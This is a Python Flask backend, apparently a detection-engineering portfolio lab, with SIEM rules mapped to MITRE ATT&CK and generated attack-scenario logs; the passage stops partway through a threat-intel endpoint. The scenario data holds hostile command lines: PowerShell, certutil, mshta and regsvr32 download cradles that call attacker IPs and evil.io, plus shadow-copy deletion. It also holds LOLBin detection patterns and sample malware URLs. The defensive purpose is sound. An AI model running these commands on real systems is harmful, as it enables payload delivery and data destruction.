"""
Detection Engineering Lab - Python Backend
Portfolio project for Detection Engineer role
Demonstrates: SIEM rule logic, threat intel integration, log analysis, MITRE ATT&CK mapping
"""

from flask import Flask, jsonify, request, abort
import os, time, html, ipaddress
from functools import wraps
from flask_cors import CORS
import requests
import re
import json
import math
import random
from datetime import datetime, timedelta
from collections import defaultdict, Counter

app = Flask(__name__)

# ─────────────────────────────────────────────
# SECURITY HARDENING
# ─────────────────────────────────────────────
# Max request body: 64 KB — prevents memory exhaustion DoS
app.config['MAX_CONTENT_LENGTH'] = 64 * 1024

# CORS — restrict origins (portfolio: allow GitHub Pages + localhost)
CORS(app, origins=["https://krutik2907.github.io",
                   "http://localhost:5050", "http://localhost:3000",
                   "http://127.0.0.1:5050", "http://127.0.0.1"],
     methods=["GET", "POST"], max_age=600)

# ── Rate Limiter (in-memory, per-IP) ──────────────────────────
# Defends against: T1498 (DoS), T1110 (API brute force), T1190 (automated scanning)
_rate_store = defaultdict(list)
RATE_LIMIT = 60
RATE_WINDOW = 60

def get_client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        candidate = xff.split(",")[0].strip()
        try:
            ipaddress.ip_address(candidate)
            return candidate
        except ValueError:
            pass
    return request.remote_addr or "unknown"

def rate_limit(fn):
    """Rate-limit decorator — 60 req/min per IP"""
    @wraps(fn)
    def wrapper(*args, **kwargs):
        ip = get_client_ip()
        now = time.time()
        _rate_store[ip] = [t for t in _rate_store[ip] if now - t < RATE_WINDOW]
        if len(_rate_store[ip]) >= RATE_LIMIT:
            remaining = int(RATE_WINDOW - (now - _rate_store[ip][0]))
            return jsonify({"error": "Rate limit exceeded", "retry_after_s": remaining}), 429
        _rate_store[ip].append(now)
        return fn(*args, **kwargs)
    return wrapper

# ── Security headers — added to every response ────────────────
# Mitigates: T1189 (drive-by), T1185 (session hijack), clickjacking, XSS, MIME sniff
@app.after_request
def add_security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
    response.headers["Content-Security-Policy"] = "default-src 'none'; frame-ancestors 'none';"
    # Remove server fingerprinting — T1592 (recon prevention)
    response.headers.pop("Server", None)
    response.headers.pop("X-Powered-By", None)
    return response

# ── Input sanitisation ─────────────────────────────────────────
# Guards against: T1059 (injection), T1190 (web exploit), log injection, path traversal
MAX_IOC_LEN   = 512
MAX_QUERY_LEN = 2048
MAX_TEXT_LEN  = 4096

_IOC_PATTERN = re.compile(
    r"^(?:"
    r"(?:[0-9]{1,3}[.]){3}[0-9]{1,3}"       # IPv4
    r"|[a-fA-F0-9]{32,64}"                    # MD5 / SHA256
    r"|(?:[a-zA-Z0-9-]+[.])+[a-zA-Z]{2,63}"  # domain
    r"|https?://[\w./:%@?=&#-]+"             # URL
    r")$"
)

_INTERNAL_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
]

def is_internal_ip(addr):
    try:
        ip = ipaddress.ip_address(addr)
        return any(ip in net for net in _INTERNAL_NETS)
    except ValueError:
        return False

def sanitise_string(s, max_len=512, strip_html=True):
    """Truncate, strip HTML, remove control chars — prevents log injection (T1562.006)"""
    if not isinstance(s, str):
        return ""
    s = s[:max_len]
    if strip_html:
        s = html.escape(s)
    # Remove null bytes, ANSI escape codes
    s = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]", "", s)
    return s.strip()

def require_json(fn):
    """Enforce Content-Type: application/json on POST requests"""
    @wraps(fn)
    def wrapper(*args, **kwargs):
        if request.method == "POST" and not request.is_json:
            return jsonify({"error": "Content-Type must be application/json"}), 415
        return fn(*args, **kwargs)
    return wrapper

def audit_log(event, detail=""):
    """Structured audit log to stdout (collected by Render)"""
    ip = get_client_ip()
    detail_safe = re.sub(r"[\n\r\t]", " ", str(detail))[:256]
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"[AUDIT] ts={ts} ip={ip} event={event} detail={detail_safe}")

VALID_SCENARIOS = frozenset({
    "powershell","bruteforce","dns_tunneling","lateral","ransomware",
    "kerberoasting","lolbin","wmi_persistence","dcsync","scheduled_task"
})


# ─────────────────────────────────────────────
# DETECTION ENGINE — Core rule matching logic
# ─────────────────────────────────────────────

class DetectionRule:
    """Represents a SIEM detection rule with MITRE ATT&CK mapping"""
    def __init__(self, rule_id, name, mitre_id, tactic, severity, logic_fn, description, fp_filters=None):
        self.rule_id = rule_id
        self.name = name
        self.mitre_id = mitre_id
        self.tactic = tactic
        self.severity = severity
        self.logic_fn = logic_fn
        self.description = description
        self.fp_filters = fp_filters or []
        self.hit_count = 0

    def evaluate(self, events):
        """Run rule logic against a list of log events. Returns list of alerts."""
        alerts = []
        try:
            results = self.logic_fn(events)
            for r in results:
                # Apply false positive filters
                is_fp = any(fp(r) for fp in self.fp_filters)
                if not is_fp:
                    alerts.append({
                        "rule_id": self.rule_id,
                        "rule_name": self.name,
                        "mitre_id": self.mitre_id,
                        "tactic": self.tactic,
                        "severity": self.severity,
                        "description": self.description,
                        "matched_event": r,
                        "timestamp": r.get("timestamp", datetime.now().isoformat())
                    })
                    self.hit_count += 1
        except Exception as e:
            pass
        return alerts


# ─────────────────────────────────────────────
# RULE DEFINITIONS — Detection logic in Python
# ─────────────────────────────────────────────

def rule_powershell_obfuscation(events):
    """Detect obfuscated PowerShell execution (T1059.001)"""
    matches = []
    ps_events = [e for e in events if e.get("process","").lower() in ("powershell.exe","pwsh.exe")]
    for e in ps_events:
        cmd = e.get("command_line", "")
        flags = []
        if re.search(r'-en[c]?[o]?[d]?[e]?[d]?', cmd, re.IGNORECASE): flags.append("encoded_cmd")
        if re.search(r'-[Nn][Oo][Pp]', cmd): flags.append("noprofile")
        if re.search(r'[Bb][Yy][Pp][Aa][Ss][Ss]', cmd): flags.append("policy_bypass")
        if re.search(r'-[Ww]\s+[Hh]', cmd): flags.append("hidden_window")
        if re.search(r'(IEX|Invoke-Expression|iex)', cmd): flags.append("iex_execution")
        if re.search(r'(DownloadString|WebClient|Net\.WebClient)', cmd): flags.append("web_download")
        # High entropy check (base64 padding is a strong signal)
        b64_match = re.search(r'[A-Za-z0-9+/]{50,}={0,2}', cmd)
        if b64_match:
            segment = b64_match.group()
            entropy = calculate_entropy(segment)
            if entropy > 4.5:
                flags.append(f"high_entropy_b64:{entropy:.2f}")
        if len(flags) >= 2:
            e["detection_flags"] = flags
            e["risk_score"] = min(100, 40 + len(flags) * 12)
            matches.append(e)
    return matches


def rule_brute_force_rdp(events):
    """Detect RDP brute force attacks (T1110.001)"""
    matches = []
    failed_logins = [e for e in events if e.get("event_id") == 4625 and e.get("logon_type") == 10]
    # Group by source IP
    by_src = defaultdict(list)
    for e in failed_logins:
        by_src[e.get("src_ip", "unknown")].append(e)
    for src_ip, attempts in by_src.items():
        if len(attempts) >= 5:
            # Check if followed by success (T1078 chain)
            success = [e for e in events if e.get("event_id") == 4624 and e.get("src_ip") == src_ip]
            result = {
                "src_ip": src_ip,
                "attempt_count": len(attempts),
                "target_users": list(set(a.get("user","?") for a in attempts)),
                "success_after_brute": len(success) > 0,
                "timestamp": attempts[0].get("timestamp"),
                "risk_score": 75 + (25 if success else 0)
            }
            matches.append(result)
    return matches


def rule_dns_tunneling(events):
    """Detect DNS tunneling / C2 over DNS (T1071.004)"""
    matches = []
    dns_events = [e for e in events if e.get("event_type") == "dns_query"]
    by_domain = defaultdict(list)
    for e in dns_events:
        domain = e.get("query", "")
        apex = ".".join(domain.split(".")[-2:]) if domain.count(".") >= 1 else domain
        by_domain[apex].append(e)
    for apex, queries in by_domain.items():
        if len(queries) < 3:
            continue
        subdomains = [q.get("query","").split(".")[0] for q in queries if q.get("query","").count(".") >= 2]
        if not subdomains:
            continue
        avg_len = sum(len(s) for s in subdomains) / len(subdomains)
        entropies = [calculate_entropy(s) for s in subdomains if len(s) > 5]
        avg_entropy = sum(entropies) / len(entropies) if entropies else 0
        # High query rate + high entropy subdomains = tunneling
        if len(queries) > 10 and avg_entropy > 3.8:
            matches.append({
                "apex_domain": apex,
                "query_count": len(queries),
                "avg_subdomain_len": round(avg_len, 1),
                "avg_entropy": round(avg_entropy, 2),
                "src_hosts": list(set(q.get("src_host","?") for q in queries)),
                "timestamp": queries[0].get("timestamp"),
                "risk_score": min(100, int(avg_entropy * 15 + len(queries) * 0.5))
            })
    return matches


def rule_lsass_access(events):
    """Detect LSASS memory access (credential dumping T1003.001)"""
    matches = []
    lsass_events = [e for e in events
                    if e.get("event_id") == 10
                    and "lsass.exe" in e.get("target_process","").lower()]
    for e in lsass_events:
        access_mask = e.get("granted_access", "")
        # PROCESS_VM_READ | PROCESS_QUERY_INFO are credential dump signatures
        suspicious_masks = ["0x1010", "0x1410", "0x143a", "0x1fffff"]
        is_suspicious = any(m in access_mask.lower() for m in suspicious_masks)
        source = e.get("source_process", "")
        known_legit = ["csrss.exe", "werfault.exe", "taskmgr.exe", "procexp64.exe"]
        if is_suspicious or (source and not any(l in source.lower() for l in known_legit)):
            e["risk_score"] = 95
            e["credential_dump_likely"] = True
            matches.append(e)
    return matches


def rule_lateral_movement_pth(events):
    """Detect Pass-the-Hash lateral movement (T1550.002)"""
    matches = []
    ntlm_logins = [e for e in events
                   if e.get("event_id") == 4624
                   and e.get("logon_type") == 3
                   and e.get("auth_package", "").upper() == "NTLM"]
    by_user = defaultdict(list)
    for e in ntlm_logins:
        key = (e.get("user","?"), e.get("src_host","?"))
        by_user[key].append(e)
    for (user, src_host), logins in by_user.items():
        unique_targets = set(e.get("dest_host","?") for e in logins)
        if len(unique_targets) >= 3:
            matches.append({
                "user": user,
                "src_host": src_host,
                "targets_reached": list(unique_targets),
                "lateral_hop_count": len(unique_targets),
                "logins": len(logins),
                "timestamp": logins[0].get("timestamp"),
                "risk_score": min(100, 60 + len(unique_targets) * 8)
            })
    return matches


def rule_mass_file_encryption(events):
    """Detect ransomware file encryption activity (T1486)"""
    matches = []
    file_events = [e for e in events if e.get("event_type") == "file_rename"]
    ransomware_extensions = [".locked", ".encrypted", ".crypto", ".crypt", ".enc",
                              ".wnry", ".wncry", ".locky", ".cerber", ".zepto"]
    by_process = defaultdict(list)
    for e in file_events:
        new_name = e.get("new_filename", "").lower()
        if any(ext in new_name for ext in ransomware_extensions):
            by_process[e.get("process_id","?")].append(e)
    for pid, events_list in by_process.items():
        if len(events_list) >= 10:
            matches.append({
                "process_id": pid,
                "process_name": events_list[0].get("process_name","unknown"),
                "files_encrypted": len(events_list),
                "src_host": events_list[0].get("src_host","?"),
                "user": events_list[0].get("user","?"),
                "timestamp": events_list[0].get("timestamp"),
                "risk_score": 100
            })
    return matches


def rule_kerberoasting(events):
    """Detect Kerberoasting — TGS requests for service accounts (T1558.003)"""
    matches = []
    tgs_events = [e for e in events
                  if e.get("event_id") == 4769
                  and e.get("ticket_encryption") in ("0x17", "0x18")
                  and not e.get("service_name", "").endswith("$")]
    by_user = defaultdict(list)
    for e in tgs_events:
        by_user[e.get("user", "?")].append(e)
    for user, reqs in by_user.items():
        unique_svcs = set(e.get("service_name", "?") for e in reqs)
        if len(unique_svcs) >= 3:
            matches.append({
                "user": user,
                "src_host": reqs[0].get("src_host", "?"),
                "services_targeted": list(unique_svcs),
                "ticket_count": len(reqs),
                "encryption_type": "RC4 (0x17) — crackable offline",
                "timestamp": reqs[0].get("timestamp"),
                "risk_score": min(100, 55 + len(unique_svcs) * 10)
            })
    return matches


def rule_lolbin_abuse(events):
    """Detect LOLBin abuse — certutil, mshta, regsvr32 etc. (T1218)"""
    LOLBINS = {
        "certutil.exe": ["-urlcache", "-decode", "-encode"],
        "mshta.exe": ["http://", "https://", "vbscript:", "javascript:"],
        "regsvr32.exe": ["scrobj.dll", "http"],
        "rundll32.exe": ["javascript:", "shell32", "http"],
        "wmic.exe": ["process call create", "/node:"],
        "bitsadmin.exe": ["/transfer", "/download"],
        "msiexec.exe": ["/i http", "\\\\"],
    }
    matches = []
    proc_events = [e for e in events if e.get("event_id") in (1, 4688)]
    for e in proc_events:
        process = e.get("process", e.get("new_process_name", "")).lower().split("\\")[-1]
        cmd = e.get("command_line", "").lower()
        if process in LOLBINS:
            flags = [f for f in LOLBINS[process] if f.lower() in cmd]
            if flags:
                e["lolbin"] = process
                e["suspicious_flags"] = flags
                e["risk_score"] = 70 + len(flags) * 8
                matches.append(e)
    return matches


def rule_wmi_persistence(events):
    """Detect WMI event subscription persistence (T1546.003)"""
    matches = []
    wmi_events = [e for e in events if e.get("event_id") in (19, 20, 21)
                  or e.get("event_type") == "wmi_subscription"]
    for e in wmi_events:
        consumer = e.get("consumer_name", e.get("consumer", "")).lower()
        legit = ["scm event log consumer", "nteventsink", "sccm"]
        if not any(l in consumer for l in legit):
            e["risk_score"] = 85
            e["persistence_type"] = "WMI Event Subscription"
            matches.append(e)
    proc_events = [e for e in events if e.get("event_id") in (1, 4688)]
    for e in proc_events:
        cmd = e.get("command_line", "").lower()
        if "wmic" in cmd and any(k in cmd for k in ["subscription", "eventfilter", "eventconsumer"]):
            e["risk_score"] = 90
            e["persistence_type"] = "WMI Subscription via CLI"
            matches.append(e)
    return matches


def rule_dcsync(events):
    """Detect DCSync attack — replication from non-DC (T1003.006)"""
    matches = []
    repl_events = [e for e in events
                   if e.get("event_id") == 4662
                   and "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" in e.get("properties", "")]
    known_dcs = ["DC01", "DC02", "DC03", "ADDC"]
    for e in repl_events:
        src = e.get("src_host", "")
        if not any(dc.lower() in src.lower() for dc in known_dcs):
            e["risk_score"] = 98
            e["attack"] = "DCSync — non-DC requesting AD replication"
            matches.append(e)
    return matches


def rule_scheduled_task_persistence(events):
    """Detect malicious scheduled task creation (T1053.005)"""
    matches = []
    task_events = [e for e in events if e.get("event_id") in (4698, 4702)]
    for e in task_events:
        content = e.get("task_content", e.get("command_line", "")).lower()
        flags = []
        if any(x in content for x in ["powershell", "cmd.exe", "wscript", "mshta"]): flags.append("shell_in_task")
        if any(x in content for x in ["temp", "appdata", "public", "programdata"]): flags.append("temp_path")
        if any(x in content for x in ["-enc", "-nop", "bypass", "hidden"]): flags.append("obfuscation")
        if any(x in content for x in ["http://", "https://", "\\\\"]): flags.append("network_ref")
        if len(flags) >= 2:
            e["suspicious_indicators"] = flags
            e["risk_score"] = 65 + len(flags) * 8
            matches.append(e)
    proc_events = [e for e in events if e.get("event_id") in (1, 4688)]
    for e in proc_events:
        cmd = e.get("command_line", "").lower()
        if "schtasks" in cmd and "/create" in cmd:
            flags = []
            if any(x in cmd for x in ["powershell", "cmd", "mshta"]): flags.append("shell_in_task")
            if any(x in cmd for x in ["appdata", "temp", "public"]): flags.append("suspicious_path")
            if flags:
                e["suspicious_indicators"] = flags
                e["risk_score"] = 75
                matches.append(e)
    return matches


# ─────────────────────────────────────────────
# DETECTION ENGINE REGISTRY
# ─────────────────────────────────────────────

DETECTION_RULES = [
    DetectionRule("DR-001", "Obfuscated PowerShell Execution", "T1059.001",
                  "Execution", "Critical", rule_powershell_obfuscation,
                  "Detects encoded, hidden, or policy-bypass PowerShell invocations",
                  fp_filters=[lambda e: "svc_deploy" in str(e.get("user",""))]),

    DetectionRule("DR-002", "RDP Brute Force Attack", "T1110.001",
                  "Credential Access", "High", rule_brute_force_rdp,
                  "5+ failed RDP logons from same source IP within observation window"),

    DetectionRule("DR-003", "DNS Tunneling / C2 over DNS", "T1071.004",
                  "Command & Control", "High", rule_dns_tunneling,
                  "High-entropy subdomain labels with elevated query volume"),

    DetectionRule("DR-004", "LSASS Memory Access", "T1003.001",
                  "Credential Access", "Critical", rule_lsass_access,
                  "Suspicious process opening LSASS with VM_READ access rights"),

    DetectionRule("DR-005", "Pass-the-Hash Lateral Movement", "T1550.002",
                  "Lateral Movement", "Critical", rule_lateral_movement_pth,
                  "NTLM Type-3 network logons to 3+ hosts by same account"),

    DetectionRule("DR-006", "Mass File Encryption (Ransomware)", "T1486",
                  "Impact", "Critical", rule_mass_file_encryption,
                  "10+ file renames to ransomware extensions from single process"),

    DetectionRule("DR-007", "Kerberoasting Attack", "T1558.003",
                  "Credential Access", "High", rule_kerberoasting,
                  "RC4 TGS tickets for 3+ service accounts by same user — offline crackable"),

    DetectionRule("DR-008", "LOLBin Abuse", "T1218",
                  "Defense Evasion", "High", rule_lolbin_abuse,
                  "Living-off-the-land binaries (certutil/mshta/regsvr32) with suspicious args"),

    DetectionRule("DR-009", "WMI Persistence", "T1546.003",
                  "Persistence", "High", rule_wmi_persistence,
                  "WMI event subscription created by non-standard consumer process"),

    DetectionRule("DR-010", "DCSync Attack", "T1003.006",
                  "Credential Access", "Critical", rule_dcsync,
                  "AD directory replication rights exercised from non-DC host"),

    DetectionRule("DR-011", "Scheduled Task Persistence", "T1053.005",
                  "Persistence", "High", rule_scheduled_task_persistence,
                  "Scheduled task created with shell, obfuscation, or network-fetch indicators"),
]


# ─────────────────────────────────────────────
# HELPER FUNCTIONS
# ─────────────────────────────────────────────

def calculate_entropy(data):
    """Shannon entropy — used to detect encoded/compressed payloads"""
    if not data:
        return 0.0
    freq = Counter(data)
    length = len(data)
    return -sum((c / length) * math.log2(c / length) for c in freq.values())


def generate_scenario_events(scenario):
    """Generate realistic log events for a given attack scenario"""
    now = datetime.now()
    base_ts = lambda offset_s: (now - timedelta(seconds=offset_s)).isoformat()

    scenarios = {
        "powershell": [
            {"event_id": 4104, "process": "powershell.exe", "user": "john.doe",
             "src_host": "WORKSTATION-04", "command_line":
             "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMAVABDAG8AcABDAGwAaQBlAG4AdA==",
             "timestamp": base_ts(50)},
            {"event_id": 4688, "process": "powershell.exe", "user": "john.doe",
             "src_host": "WORKSTATION-04", "command_line":
             "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/payload.ps1')",
             "timestamp": base_ts(45)},
            {"event_id": 4104, "process": "powershell.exe", "user": "john.doe",
             "src_host": "WORKSTATION-04", "command_line":
             "powershell.exe -nop -NonInteractive -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
             "timestamp": base_ts(40)},
        ],
        "bruteforce": [
            *[{"event_id": 4625, "logon_type": 10, "user": "Administrator",
               "src_ip": "203.0.113.42", "src_host": "WORKSTATION-04",
               "dest_host": "DC01", "failure_reason": "Wrong password",
               "timestamp": base_ts(120 - i * 2)} for i in range(47)],
            {"event_id": 4624, "logon_type": 10, "user": "Administrator",
             "src_ip": "203.0.113.42", "src_host": "WORKSTATION-04",
             "dest_host": "DC01", "auth_package": "NTLM",
             "timestamp": base_ts(26)},
        ],
        "dns_tunneling": [
            *[{"event_type": "dns_query", "src_host": f"WORKSTATION-{random.randint(1,10):02d}",
               "query": f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', k=random.randint(28,48)))}.evil-c2.net",
               "response": "NXDOMAIN",
               "timestamp": base_ts(300 - i)} for i in range(45)],
        ],
        "lateral": [
            *[{"event_id": 4624, "logon_type": 3, "user": "svc_backup",
               "src_host": "WORKSTATION-14", "dest_host": f"10.0.1.{30+i}",
               "auth_package": "NTLM", "timestamp": base_ts(60 - i * 8)} for i in range(5)],
            {"event_id": 10, "target_process": "lsass.exe",
             "source_process": "cmd.exe", "granted_access": "0x143a",
             "src_host": "10.0.1.30", "user": "svc_backup",
             "timestamp": base_ts(20)},
        ],
        "ransomware": [
            *[{"event_type": "file_rename", "process_name": "svchost_update.exe",
               "process_id": "4492", "user": "helpdesk01",
               "src_host": "FILE-SERVER-01",
               "old_filename": f"document_{i:04d}.docx",
               "new_filename": f"document_{i:04d}.locked",
               "timestamp": base_ts(120 - i)} for i in range(250)],
            {"event_id": 4688, "process": "cmd.exe", "user": "helpdesk01",
             "src_host": "FILE-SERVER-01",
             "command_line": "cmd.exe /c vssadmin delete shadows /all /quiet",
             "timestamp": base_ts(118)},
            {"event_id": 4688, "process": "cmd.exe", "user": "helpdesk01",
             "src_host": "FILE-SERVER-01",
             "command_line": "bcdedit /set {default} recoveryenabled No",
             "timestamp": base_ts(115)},
        ],
        "kerberoasting": [
            *[{"event_id": 4769, "user": "john.doe", "src_host": "WORKSTATION-04",
               "service_name": svc, "ticket_encryption": "0x17",
               "dest_host": "DC01", "timestamp": base_ts(300 - i * 15)}
              for i, svc in enumerate(["MSSQLSvc/db01.corp.local:1433",
                                       "HTTP/webserver.corp.local",
                                       "CIFS/fileserver.corp.local",
                                       "HOST/printserver.corp.local"])],
        ],
        "lolbin": [
            {"event_id": 4688, "process": "certutil.exe", "user": "jane.smith",
             "src_host": "WORKSTATION-07",
             "command_line": "certutil.exe -urlcache -split -f http://185.220.101.45/payload.exe C:\\Users\\Public\\payload.exe",
             "timestamp": base_ts(60)},
            {"event_id": 4688, "process": "mshta.exe", "user": "jane.smith",
             "src_host": "WORKSTATION-07",
             "command_line": "mshta.exe vbscript:CreateObject(\"Wscript.Shell\").Run(\"powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(\'http://185.220.101.45/stager.ps1\')\")(window.close)",
             "timestamp": base_ts(45)},
            {"event_id": 1, "process": "regsvr32.exe", "user": "jane.smith",
             "src_host": "WORKSTATION-07",
             "command_line": "regsvr32.exe /s /u /i:http://185.220.101.45/payload.sct scrobj.dll",
             "timestamp": base_ts(30)},
        ],
        "wmi_persistence": [
            {"event_id": 19, "event_type": "wmi_subscription",
             "consumer_name": "WindowsUpdaterConsumer",
             "consumer": "powershell.exe -nop -enc JABjAGwAaQBlAG4AdA==",
             "filter_name": "SystemStartupFilter",
             "src_host": "WORKSTATION-09", "user": "SYSTEM",
             "timestamp": base_ts(120)},
            {"event_id": 20, "event_type": "wmi_subscription",
             "consumer_name": "BackupConsumer",
             "consumer": "cmd.exe /c certutil -urlcache -f http://evil.io/b.exe %TEMP%\\svc.exe",
             "filter_name": "OnLogonFilter",
             "src_host": "WORKSTATION-09", "user": "SYSTEM",
             "timestamp": base_ts(100)},
        ],
        "dcsync": [
            {"event_id": 4662, "src_host": "WORKSTATION-11",
             "user": "corp\\john.doe",
             "properties": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 DS-Replication-Get-Changes",
             "object": "DC=corp,DC=local",
             "timestamp": base_ts(30)},
            {"event_id": 4662, "src_host": "WORKSTATION-11",
             "user": "corp\\john.doe",
             "properties": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 DS-Replication-Get-Changes-All",
             "object": "DC=corp,DC=local",
             "timestamp": base_ts(28)},
        ],
        "scheduled_task": [
            {"event_id": 4698, "user": "helpdesk01", "src_host": "WORKSTATION-03",
             "task_name": "\\Microsoft\\Windows\\WindowsUpdate\\Updater",
             "task_content": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA= /tr C:\\Users\\Public\\svc.exe /sc onlogon",
             "timestamp": base_ts(90)},
            {"event_id": 4688, "process": "schtasks.exe", "user": "helpdesk01",
             "src_host": "WORKSTATION-03",
             "command_line": "schtasks /create /tn WindowsDefenderUpdate /tr \"C:\\Users\\Public\\AppData\\update.exe\" /sc onlogon /ru SYSTEM",
             "timestamp": base_ts(85)},
        ],
    }
    return scenarios.get(scenario, [])


# ─────────────────────────────────────────────
# MITRE ATT&CK COVERAGE MAP
# ─────────────────────────────────────────────

MITRE_COVERAGE = [
    {"id": "T1059.001", "name": "PowerShell", "tactic": "Execution", "status": "covered", "rules": ["DR-001"]},
    {"id": "T1059.003", "name": "Windows Cmd Shell", "tactic": "Execution", "status": "partial", "rules": []},
    {"id": "T1055", "name": "Process Injection", "tactic": "Privilege Escalation", "status": "partial", "rules": []},
    {"id": "T1003.001", "name": "LSASS Memory", "tactic": "Credential Access", "status": "covered", "rules": ["DR-004"]},
    {"id": "T1071.001", "name": "Web Protocol C2", "tactic": "Command & Control", "status": "partial", "rules": []},
    {"id": "T1071.004", "name": "DNS C2", "tactic": "Command & Control", "status": "covered", "rules": ["DR-003"]},
    {"id": "T1486", "name": "Data Encrypted for Impact", "tactic": "Impact", "status": "covered", "rules": ["DR-006"]},
    {"id": "T1078", "name": "Valid Accounts", "tactic": "Initial Access", "status": "partial", "rules": []},
    {"id": "T1566.001", "name": "Spearphishing Attachment", "tactic": "Initial Access", "status": "partial", "rules": []},
    {"id": "T1021.001", "name": "Remote Desktop Protocol", "tactic": "Lateral Movement", "status": "covered", "rules": ["DR-002"]},
    {"id": "T1547.001", "name": "Registry Run Keys", "tactic": "Persistence", "status": "uncovered", "rules": []},
    {"id": "T1053.005", "name": "Scheduled Task", "tactic": "Persistence", "status": "uncovered", "rules": []},
    {"id": "T1027", "name": "Obfuscated Files/Info", "tactic": "Defense Evasion", "status": "covered", "rules": ["DR-001"]},
    {"id": "T1562.001", "name": "Disable Security Tools", "tactic": "Defense Evasion", "status": "uncovered", "rules": []},
    {"id": "T1036.005", "name": "Match Legitimate Name", "tactic": "Defense Evasion", "status": "uncovered", "rules": []},
    {"id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command & Control", "status": "uncovered", "rules": []},
    {"id": "T1048", "name": "Exfil via Alt Protocol", "tactic": "Exfiltration", "status": "covered", "rules": ["DR-003"]},
    {"id": "T1110.001", "name": "Password Guessing", "tactic": "Credential Access", "status": "covered", "rules": ["DR-002"]},
    {"id": "T1110.003", "name": "Password Spraying", "tactic": "Credential Access", "status": "partial", "rules": []},
    {"id": "T1550.002", "name": "Pass the Hash", "tactic": "Lateral Movement", "status": "covered", "rules": ["DR-005"]},
    {"id": "T1135", "name": "Network Share Discovery", "tactic": "Discovery", "status": "uncovered", "rules": []},
    {"id": "T1082", "name": "System Info Discovery", "tactic": "Discovery", "status": "uncovered", "rules": []},
    {"id": "T1490", "name": "Inhibit System Recovery", "tactic": "Impact", "status": "covered", "rules": ["DR-006"]},
    {"id": "T1204.001", "name": "Malicious Link", "tactic": "Execution", "status": "uncovered", "rules": []},
    {"id": "T1558.003", "name": "Kerberoasting", "tactic": "Credential Access", "status": "covered", "rules": ["DR-007"]},
    {"id": "T1218", "name": "LOLBin Abuse", "tactic": "Defense Evasion", "status": "covered", "rules": ["DR-008"]},
    {"id": "T1546.003", "name": "WMI Persistence", "tactic": "Persistence", "status": "covered", "rules": ["DR-009"]},
    {"id": "T1003.006", "name": "DCSync", "tactic": "Credential Access", "status": "covered", "rules": ["DR-010"]},
    {"id": "T1053.005", "name": "Scheduled Task", "tactic": "Persistence", "status": "covered", "rules": ["DR-011"]},
]


# ─────────────────────────────────────────────
# API ROUTES
# ─────────────────────────────────────────────

@app.route("/api/health")
@rate_limit
def health():
    return jsonify({"status": "ok", "engine": "Detection Lab v2.0",
                    "rules_loaded": len(DETECTION_RULES),
                    "techniques_mapped": len(MITRE_COVERAGE)})


@app.route("/api/threat-intel")
@rate_limit
def threat_intel():
    """Fetch live threat intel — tries ThreatFox first, then URLhaus, then sample fallback"""

    SAMPLE = [
        {"url": "http://malware-dl.ru/payload.exe", "host": "malware-dl.ru",
         "url_status": "online", "threat": "Emotet", "tags": ["banking", "trojan"],
         "reporter": "abuse_ch", "date_added": "2024-03-15 08:00:00"},
        {"url": "http://195.123.245.44/gate.php", "host": "195.123.245.44",
         "url_status": "online", "threat": "AgentTesla", "tags": ["stealer", "rat"],
         "reporter": "threatfox", "date_added": "2024-03-15 07:30:00"},
        {"url": "http://update-cdn.fakems.com/svchost.exe", "host": "update-cdn.fakems.com",
         "url_status": "online", "threat": "CobaltStrike", "tags": ["c2", "beacon"],
         "reporter": "hunt_team", "date_added": "2024-03-15 06:00:00"},
        {"url": "http://103.99.115.66/download", "host": "103.99.115.66",
         "url_status": "offline", "threat": "AsyncRAT", "tags": ["rat"],
         "reporter": "MalwareBazaar", "date_added": "2024-03-14 20:00:00"},
        {"url": "http://payload-delivery.ru/1.exe", "host": "payload-delivery.ru",
         "url_status": "online", "threat": "Qakbot", "tags": ["banking", "dropper"],
         "reporter": "abuse_ch", "date_added": "2024-03-14 18:00:00"},
        {"url": "http://45.142.212.100/wp-content/themes/x.exe", "host": "45.142.212.100",
         "url_status": "online", "threat": "IcedID", "tags": ["banking", "loader"],
         "reporter": "abuse_ch", "date_added": "2024-03-14 16:00:00"},
        {"url": "http://185.220.101.45/implant.bin", "host": "185.220.101.45",
         "url_status": "online", "threat": "CobaltStrike", "tags": ["c2", "tor"],
         "reporter": "hunt_team", "date_added": "2024-03-14 14:00:00"},
        {"url": "http://evil-c2.net/stage2.ps1", "host": "evil-c2.net",
         "url_status": "online", "threat": "AsyncRAT", "tags": ["rat", "powershell"],
         "reporter": "threatfox", "date_added": "2024-03-14 12:00:00"},
    ]

    def build_stats(urls, source):
        return {
            "total": len(urls),
            "online": sum(1 for u in urls if str(u.get("url_status","")).lower() == "online"),
            "malware_families": list(set(t for u in urls for t in (u.get("tags") or []) if t)),
            "source": source
        }

    # ── Source 1: OTX AlienVault (primary — API key authenticated) ──
    OTX_KEY = os.environ.get("OTX_API_KEY", "")
    if OTX_KEY:
        try:
